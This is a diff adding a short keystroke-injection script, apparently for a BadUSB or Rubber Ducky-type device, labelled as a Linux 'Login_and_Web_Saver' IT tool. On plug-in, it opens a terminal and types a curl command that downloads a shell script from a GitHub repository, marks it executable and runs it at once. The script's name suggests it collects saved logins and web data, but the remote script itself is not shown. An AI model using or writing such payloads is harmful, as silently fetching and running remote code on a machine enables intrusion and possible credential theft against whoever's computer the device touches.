@@ -1,0 +1,6 @@
+REM IT-Tool - ReadyUSB Login_and_Web_Saver.sh (Linux)
+DELAY 800
+CTRL ALT T
+DELAY 2500
+STRING curl -sL "https://github.com/IT-Tool-by-SalgadoTech/ittool-External_Tools/raw/refs/heads/main/Login_and_Web_Saver.sh" -o ~/Desktop/Login_and_Web_Saver.sh && chmod +x ~/Desktop/Login_and_Web_Saver.sh && bash ~/Desktop/Login_and_Web_Saver.sh
+ENTER
